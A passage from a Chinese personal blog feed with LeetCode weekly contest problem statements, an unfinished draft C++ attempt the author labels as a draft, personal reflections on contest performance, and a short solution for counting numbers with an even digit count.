<li><code>1 &lt;= heights[i][j] &lt;= 106</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>没什么好的想法，直观的解法就是遍历所有的走法，从（0,0）到（row-1，columns-1），不对好像也不行，因为还有往回查的。</p>
<p><strong>代码：</strong></p>
<h6 id="矩阵转换后的秩"><a href="#矩阵转换后的秩" class="headerlink" title="矩阵转换后的秩"></a>矩阵转换后的秩</h6><p><strong>题目描述：</strong></p>
<p>给你一个 <code>m x n</code> 的矩阵 <code>matrix</code> ，请你返回一个新的矩阵 <code>answer</code> ，其中 <code>answer[row][col]</code> 是 <code>matrix[row][col]</code> 的秩。</p>
<p>每个元素的 <strong>秩</strong> 是一个整数，表示这个元素相对于其他元素的大小关系，它按照如下规则计算：</p>
<ul>
<li>如果一个元素是它所在行和列的最小值，那么它的 <strong>秩</strong> 为 1。</li>
<li>如果两个元素 <code>p</code> 和 <code>q</code> 在 同一行 或者 同一列 ，那么：</li>
<li><ul>
<li>如果 <code>p &lt; q</code> ，那么 <code>rank(p) &lt; rank(q)</code></li>
<li>如果 <code>p == q</code> ，那么 <code>rank(p) == rank(q)</code></li>
<li>如果 <code>p &gt; q</code> ，那么 <code>rank(p) &gt; rank(q)</code></li>
</ul>
</li>
<li>秩 需要越 小 越好。</li>
</ul>
<p>题目保证按照上面规则 answer 数组是唯一的。</p>
<p><strong>示例1：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank1.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">输出：[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">解释：</span><br><span class="line">matrix[<span class="number">0</span>][<span class="number">0</span>] 的秩为 <span class="number">1</span> ，因为它是所在行和列的最小整数。</span><br><span class="line">matrix[<span class="number">0</span>][<span class="number">1</span>] 的秩为 <span class="number">2</span> ，因为 matrix[<span class="number">0</span>][<span class="number">1</span>] &gt; matrix[<span class="number">0</span>][<span class="number">0</span>] 且 matrix[<span class="number">0</span>][<span class="number">0</span>] 的秩为 <span class="number">1</span> 。</span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">0</span>] 的秩为 <span class="number">2</span> ，因为 matrix[<span class="number">1</span>][<span class="number">0</span>] &gt; matrix[<span class="number">0</span>][<span class="number">0</span>] 且 matrix[<span class="number">0</span>][<span class="number">0</span>] 的秩为 <span class="number">1</span> 。</span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">1</span>] 的秩为 <span class="number">3</span> ，因为 matrix[<span class="number">1</span>][<span class="number">1</span>] &gt; matrix[<span class="number">0</span>][<span class="number">1</span>]， matrix[<span class="number">1</span>][<span class="number">1</span>] &gt; matrix[<span class="number">1</span>][<span class="number">0</span>] 且 matrix[<span class="number">0</span>][<span class="number">1</span>] 和 matrix[<span class="number">1</span>][<span class="number">0</span>] 的秩都为 <span class="number">2</span> 。</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank2.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">7</span>,<span class="number">7</span>],[<span class="number">7</span>,<span class="number">7</span>]]</span><br><span class="line">输出：[[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank3.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">20</span>,<span class="number">-21</span>,<span class="number">14</span>],[<span class="number">-19</span>,<span class="number">4</span>,<span class="number">19</span>],[<span class="number">22</span>,<span class="number">-47</span>,<span class="number">24</span>],[<span class="number">-19</span>,<span class="number">4</span>,<span class="number">19</span>]]</span><br><span class="line">输出：[[<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br></pre></td></tr></table></figure>

<p><strong>示例4：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank4.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">7</span>,<span class="number">3</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">9</span>,<span class="number">8</span>,<span class="number">2</span>]]</span><br><span class="line">输出：[[<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>m == matrix.length</code></li>
<li><code>n == matrix[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 500</code></li>
<li><code>-109 &lt;= matrix[row][col] &lt;= 109</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>这道属于难题，我都没看，上一道中等题我都没做出来，还是先算了</p>
<p><strong>代码：</strong></p>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>第一次参加LeetCode周赛，只提交了一道题，排名好像几千名吧，这么看参加的人还不少哇，不过第二道题挺可惜的提交了以后超出时间限制😥也没时间改了，后来复盘发现存储范围数组的tmp容器排序代码我放到了for循环中，应该放到外面也就是说要全部获取到tmp元素后再调用sort函数排序，不能放入一个元素就排一下序，没必要。其实参加周赛的时候心神不定，不专注，有心事。或许是因为没信心吧，所以做的慢了些，效率不高，下次加油吧。</p>
<p>啊好懵，本科学的算法和数据结构都忘了（也可能没学会）🤣。决定还是先刷简单题吧，这周赛我觉得我现在水平不太行，题解要写好久，等到刷了一定数量的简单题有了一定的水平之后再来完成这些周赛的题解吧，不过我一定会回来的🤔</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>CONTEST</category>
      </categories>
      <tags>
        <tag>LeetCode周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>第213场周赛</title>
    <url>/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/contest/weekly-contest-213/">比赛地址</a></p>
<h6 id="比赛说明"><a href="#比赛说明" class="headerlink" title="比赛说明"></a>比赛说明</h6><p>本场竞赛由「coupang」&amp;「力扣」联合主办</p>
<p><strong>【工作机会奖励】</strong></p>
<ul>
<li><strong>排名第 1 ~ 300 名的参赛者</strong>可获「 coupang」简历内推机会。</li>
</ul>
<p><strong>【实物周边奖励】</strong></p>
<ul>
<li><strong>排名第 1 名的参赛者</strong>可获coupang提供的「小爱音响」×1</li>
<li><strong>排名第 2 名的参赛者</strong>可获coupang提供的「小米手环」×1</li>
<li><strong>排名第 3 ~ 55 名的参赛者</strong>可获coupang「棒球帽」×1</li>
<li><strong>排名第 199、399、599、999、1999 名的参赛者</strong>可获coupang「棒球帽」×1</li>
</ul>
<a id="more"></a>

<p>重要提示**</p>
<ol>
<li><p>请注意，每个错误提交的惩罚时间已经从 <strong>10分钟</strong> 改变为了 <strong>5分钟</strong> 。</p>
</li>
<li><p>力扣一向非常重视竞赛的公平，为了保障每一位用户的权益，如有用户被检查出竞赛中存在违规行为（如抄袭、作弊等），我们会坚持以 <strong>零容忍</strong> 的态度维护竞赛的公平、公正。</p>
</li>
<li><p>以下被判定为竞赛中的违规行为</p>
<ul>
<li><p>一人使用多账号提交（英文站 LCUS 的账号 和 中文站 LCCN 的账号属于两个账号）</p>
</li>
<li><p>通过不正当的方式将部分或全部测试用例的答案直接贴到代码里的</p>
</li>
<li><p>多账号提交雷同代码（抄袭）</p>
</li>
<li><p>使用不正当手段影响他人竞赛的</p>
</li>
<li><p>竞赛结束前在讨论区发布答案的</p>
</li>
</ul>
</li>
<li><p>如被发现违规行为，我们将会严格按照以下处罚规则执行：</p>
<ul>
<li><p><strong>第一次违规</strong>：账号内的所有积分清零，账号冻结 1 个月</p>
</li>
<li><p><strong>第二次违规</strong>：永久封号</p>
</li>
</ul>
</li>
<li><p>同时我们也鼓励大家共同维护竞赛的公平和公正，我们会给与举报成功的用户额外的奖励：</p>
<ul>
<li><p>被认定为违规账号的前 10 名举报者，每人可获得 20 积分奖励</p>
</li>
<li><p>每人每场最高可获得举报成功的 100 积分奖励</p>
</li>
</ul>
</li>
</ol>
<h6 id="题目列表重要提示"><a href="#题目列表重要提示" class="headerlink" title="题目列表重要提示**"></a>题目列表重要提示**</h6><ol>
<li><p>请注意，每个错误提交的惩罚时间已经从 <strong>10分钟</strong> 改变为了 <strong>5分钟</strong> 。</p>
</li>
<li><p>力扣一向非常重视竞赛的公平，为了保障每一位用户的权益，如有用户被检查出竞赛中存在违规行为（如抄袭、作弊等），我们会坚持以 <strong>零容忍</strong> 的态度维护竞赛的公平、公正。</p>
</li>
<li><p>以下被判定为竞赛中的违规行为</p>
<ul>
<li><p>一人使用多账号提交（英文站 LCUS 的账号 和 中文站 LCCN 的账号属于两个账号）</p>
</li>
<li><p>通过不正当的方式将部分或全部测试用例的答案直接贴到代码里的</p>
</li>
<li><p>多账号提交雷同代码（抄袭）</p>
</li>
<li><p>使用不正当手段影响他人竞赛的</p>
</li>
<li><p>竞赛结束前在讨论区发布答案的</p>
</li>
</ul>
</li>
<li><p>如被发现违规行为，我们将会严格按照以下处罚规则执行：</p>
<ul>
<li><p><strong>第一次违规</strong>：账号内的所有积分清零，账号冻结 1 个月</p>
</li>
<li><p><strong>第二次违规</strong>：永久封号</p>
</li>
</ul>
</li>
<li><p>同时我们也鼓励大家共同维护竞赛的公平和公正，我们会给与举报成功的用户额外的奖励：</p>
<ul>
<li><p>被认定为违规账号的前 10 名举报者，每人可获得 20 积分奖励</p>
</li>
<li><p>每人每场最高可获得举报成功的 100 积分奖励</p>
</li>
</ul>
</li>
</ol>
<h6 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h6><table>
<thead>
<tr>
<th>题目</th>
<th>难度</th>
<th>得分</th>
</tr>
</thead>
<tbody><tr>
<td>1.<a href="https://leetcode-cn.com/problems/check-array-formation-through-concatenation/">能否连接形成数组</a></td>
<td>简单</td>
<td>3</td>
</tr>
<tr>
<td>2.<a href="https://leetcode-cn.com/problems/count-sorted-vowel-strings/">统计字典序元音字符串的数目</a></td>
<td>中等</td>
<td>4</td>
</tr>
<tr>
<td>3.<a href="https://leetcode-cn.com/problems/furthest-building-you-can-reach/">可以到达的最远建筑</a></td>
<td>中等</td>
<td>5</td>
</tr>
<tr>
<td>4.<a href="https://leetcode-cn.com/problems/kth-smallest-instructions/">第 K 条最小指令</a></td>
<td>困难</td>
<td>6</td>
</tr>
</tbody></table>
<h6 id="能否连接形成数组"><a href="#能否连接形成数组" class="headerlink" title="能否连接形成数组"></a>能否连接形成数组</h6><p><strong>题目描述：</strong></p>
<p>给你一个整数数组 <code>arr</code> ，数组中的每个整数 <strong>互不相同</strong> 。另有一个由整数数组构成的数组 <code>pieces</code>，其中的整数也 <code>互不相同</code> 。请你以 <strong>任意顺序</strong> 连接 <code>pieces</code> 中的数组以形成 <code>arr</code> 。但是，<strong>不允许</strong> 对每个数组 <code>pieces[i]</code> 中的整数重新排序。</p>
<p>如果可以连接 <code>pieces</code> 中的数组形成 <code>arr</code> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [85], pieces &#x3D; [[85]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [15,88], pieces &#x3D; [[88],[15]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [15] 和 [88]</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [49,18,16], pieces &#x3D; [[16,18,49]]</span><br><span class="line">输出：false</span><br><span class="line">解释：即便数字相符，也不能重新排列 pieces[0]</span><br></pre></td></tr></table></figure>

<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [91,4,64,78], pieces &#x3D; [[78],[4,64],[91]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [91]、[4,64] 和 [78]</span><br></pre></td></tr></table></figure>

<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,3,5,7], pieces &#x3D; [[2,4,6,8]]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= pieces.length &lt;= arr.length &lt;= 100</code></li>
<li><code>sum(pieces[i].length) == arr.length</code></li>
<li><code>1 &lt;= pieces[i].length &lt;= arr.length</code></li>
<li><code>1 &lt;= arr[i], pieces[i][j] &lt;= 100</code></li>
<li><code>arr</code> 中的整数 <strong>互不相同</strong></li>
<li><code>pieces</code> 中的整数 <strong>互不相同</strong>（也就是说，如果将 <code>pieces</code> 扁平化成一维数组，数组中的所有整数互不相同）</li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//草稿版</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canFormArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; pieces)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历查找pieces中的元素是否在arr中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pieces.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pieces[i].size();++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;arr.size();++k)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(pieces[i][j]==arr[k])&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历arr</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.size();++i)&#123;</span><br><span class="line">            <span class="comment">//遍历pieces</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pieces.size();++j)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(arr[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(arr[i])</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h6 id="可以到达的最远建筑"><a href="#可以到达的最远建筑" class="headerlink" title="可以到达的最远建筑"></a>可以到达的最远建筑</h6><p><strong>题目描述：</strong></p>
<p>给你一个整数数组 <code>heights</code> ，表示建筑物的高度。另有一些砖块 <code>bricks</code> 和梯子 <code>ladders</code> 。</p>
<p>你从建筑物 <code>0</code> 开始旅程，不断向后面的建筑物移动，期间可能会用到砖块或梯子。</p>
<p>当从建筑物 <code>i</code> 移动到建筑物 <code>i+1</code>（下标 <strong>从 0 开始</strong> ）时：</p>
<ul>
<li>如果当前建筑物的高度 <strong>大于或等于</strong> 下一建筑物的高度，则不需要梯子或砖块</li>
<li>如果当前建筑的高度 <strong>小于</strong> 下一个建筑的高度，您可以使用 <strong>一架梯子</strong> 或 (<code>h[i+1] - h[i]</code>) 个砖块</li>
</ul>
<p>如果以最佳方式使用给定的梯子和砖块，返回你可以到达的最远建筑物的下标（下标 <strong>从 0 开始</strong> ）。</p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/q4.gif" alt="img"></p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">12</span>], bricks = <span class="number">5</span>, ladders = <span class="number">1</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：从建筑物 <span class="number">0</span> 出发，你可以按此方案完成旅程：</span><br><span class="line">- 不使用砖块或梯子到达建筑物 <span class="number">1</span> ，因为 <span class="number">4</span> &gt;= <span class="number">2</span></span><br><span class="line">- 使用 <span class="number">5</span> 个砖块到达建筑物 <span class="number">2</span> 。你必须使用砖块或梯子，因为 <span class="number">2</span> &lt; <span class="number">7</span></span><br><span class="line">- 不使用砖块或梯子到达建筑物 <span class="number">3</span> ，因为 <span class="number">7</span> &gt;= <span class="number">6</span></span><br><span class="line">- 使用唯一的梯子到达建筑物 <span class="number">4</span> 。你必须使用砖块或梯子，因为 <span class="number">6</span> &lt; <span class="number">9</span></span><br><span class="line">无法越过建筑物 <span class="number">4</span> ，因为没有更多砖块或梯子。</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [4,12,2,7,3,18,20,3,19], bricks &#x3D; 10, ladders &#x3D; 2</span><br><span class="line">输出：7</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [14,3,19,3], bricks &#x3D; 17, ladders &#x3D; 0</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>



<p><strong>提示：</strong></p>
<ul>
<li>1 &lt;= heights.length &lt;= 105</li>
<li>1 &lt;= heights[i] &lt;= 106</li>
<li>0 &lt;= bricks &lt;= 109</li>
<li>0 &lt;= ladders &lt;= heights.length</li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<h6 id="第K条最小指令"><a href="#第K条最小指令" class="headerlink" title="第K条最小指令"></a>第K条最小指令</h6><p><strong>题目描述：</strong></p>
<p>Bob 站在单元格 <code>(0, 0)</code> ，想要前往目的地 <code>destination</code> ：<code>(row, column)</code> 。他只能向 <strong>右</strong> 或向 <code>下</code> 走。你可以为 Bob 提供导航 <strong>指令</strong> 来帮助他到达目的地 <code>destination</code> 。</p>
<p><strong>指令</strong> 用字符串表示，其中每个字符：</p>
<ul>
<li><code>&#39;H&#39;</code> ，意味着水平向右移动</li>
<li><code>&#39;V&#39;</code> ，意味着竖直向下移动</li>
</ul>
<p>能够为 Bob 导航到目的地 <code>destination</code> 的指令可以有多种，例如，如果目的地 <code>destination</code> 是 <code>(2, 3)</code>，<code>&quot;HHHVV&quot;</code> 和 <code>&quot;HVHVH&quot;</code> 都是有效 指令 。</p>
<p>然而，Bob 很挑剔。因为他的幸运数字是 <code>k</code>，他想要遵循 <strong>按字典序排列后的第 <code>k</code> 条最小指令</strong> 的导航前往目的地 <code>destination</code> 。<code>k</code>  的编号 <strong>从 1 开始</strong> 。</p>
<p>给你一个整数数组 <code>destination</code> 和一个整数 <code>k</code> ，请你返回可以为 Bob 提供前往目的地 <code>destination</code> 导航的 <strong>按字典序排列后的第 <code>k</code> 条最小指令</strong> 。</p>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/ex1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：destination &#x3D; [2,3], k &#x3D; 1</span><br><span class="line">输出：&quot;HHHVV&quot;</span><br><span class="line">解释：能前往 (2, 3) 的所有导航指令 按字典序排列后 如下所示：</span><br><span class="line">[&quot;HHHVV&quot;, &quot;HHVHV&quot;, &quot;HHVVH&quot;, &quot;HVHHV&quot;, &quot;HVHVH&quot;, &quot;HVVHH&quot;, &quot;VHHHV&quot;, &quot;VHHVH&quot;, &quot;VHVHH&quot;, &quot;VVHHH&quot;].</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/ex2.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：destination &#x3D; [2,3], k &#x3D; 2</span><br><span class="line">输出：&quot;HHVHV&quot;</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/ex3.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：destination &#x3D; [2,3], k &#x3D; 3</span><br><span class="line">输出：&quot;HHVVH&quot;</span><br></pre></td></tr></table></figure>



<p><strong>提示：</strong></p>
<ul>
<li><code>destination.length == 2</code></li>
<li><code>1 &lt;= row, column &lt;= 15</code></li>
<li><code>1 &lt;= k &lt;= nCr(row + column, row)</code>，其中 <code>nCr(a, b)</code> 表示组合数，即从 <code>a</code> 个物品中选 <code>b</code> 个物品的不同方案数。</li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<h6 id="统计字典序元音字符串的数目"><a href="#统计字典序元音字符串的数目" class="headerlink" title="统计字典序元音字符串的数目"></a>统计字典序元音字符串的数目</h6><p><strong>题目描述：</strong></p>
<p>给你一个整数 <code>n</code>，请返回长度为 <code>n</code> 、仅由元音 (<code>a</code>, <code>e</code>, <code>i</code>, <code>o</code>, <code>u</code>) 组成且按 <strong>字典序排列</strong> 的字符串数量。</p>
<p>字符串 <code>s</code> 按 <strong>字典序排列</strong> 需要满足：对于所有有效的 <code>i</code>，<code>s[i]</code> 在字母表中的位置总是与 <code>s[i+1]</code> 相同或在 <code>s[i+1]</code> 之前。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">1</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：仅由元音组成的 <span class="number">5</span> 个字典序字符串为 [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;u&quot;</span>]</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">2</span></span><br><span class="line">输出：<span class="number">15</span></span><br><span class="line">解释：仅由元音组成的 <span class="number">15</span> 个字典序字符串为</span><br><span class="line">[<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;ae&quot;</span>,<span class="string">&quot;ai&quot;</span>,<span class="string">&quot;ao&quot;</span>,<span class="string">&quot;au&quot;</span>,<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ei&quot;</span>,<span class="string">&quot;eo&quot;</span>,<span class="string">&quot;eu&quot;</span>,<span class="string">&quot;ii&quot;</span>,<span class="string">&quot;io&quot;</span>,<span class="string">&quot;iu&quot;</span>,<span class="string">&quot;oo&quot;</span>,<span class="string">&quot;ou&quot;</span>,<span class="string">&quot;uu&quot;</span>]</span><br><span class="line">注意，<span class="string">&quot;ea&quot;</span> 不是符合题意的字符串，因为 <span class="string">&#x27;e&#x27;</span> 在字母表中的位置比 <span class="string">&#x27;a&#x27;</span> 靠后</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">33</span></span><br><span class="line">输出：<span class="number">66045</span></span><br></pre></td></tr></table></figure>



<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 50</code> </li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这次比赛虽然也打开网站，做题1个半小时，但是心太浮躁了，尤其是今天是周日是休息的日子，自己迟到了5、6分钟，刷题量少，也没什么信心，事情也有点多，数学、机器学习、论文等反正好多东西。最简单的一道题都没做出了根本就没思路，希望自己可以保持学习的激情，下次努力，一直坚持一定会有回报的😥</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>CONTEST</category>
      </categories>
      <tags>
        <tag>LeetCode周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>统计位数为偶数的数字</title>
    <url>/2020/11/09/%E7%BB%9F%E8%AE%A1%E4%BD%8D%E6%95%B0%E4%B8%BA%E5%81%B6%E6%95%B0%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code>，请你返回其中位数为 <strong>偶数</strong> 的数字的个数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [12,345,2,6,7896]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">12 是 2 位数字（位数为偶数） </span><br><span class="line">345 是 3 位数字（位数为奇数）  </span><br><span class="line">2 是 1 位数字（位数为奇数） </span><br><span class="line">6 是 1 位数字 位数为奇数） </span><br><span class="line">7896 是 4 位数字（位数为偶数）  </span><br><span class="line">因此只有 12 和 7896 是位数为偶数的数字</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [555,901,482,1771]</span><br><span class="line">输出：1 </span><br><span class="line">解释： </span><br><span class="line">只有 1771 是位数为偶数的数字。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 500</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>1、因为<code>1&lt;=nums[i]&lt;=10^5</code>，所以位数为偶数只能有三种情况</p>
<ul>
<li>6位数，nums[i]等于100000</li>
<li>4位数，0&lt;nums[i]/1000&lt;10</li>
<li>2位数，0&lt;nums[i]/10&lt;10</li>
</ul>
<p>对这三种情况的数字进行计数即可。</p>
<p>2、另外也可以遍历数组，判断每一个整数的位数</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败96.89%，内存消耗10M，击败17.69%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">100000</span> || i/<span class="number">1000</span>!=<span class="number">0</span>&amp;&amp;i/<span class="number">1000</span>&lt;<span class="number">10</span> || i/<span class="number">10</span>!=<span class="number">0</span>&amp;&amp;i/<span class="number">10</span>&lt;<span class="number">10</span>)&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span 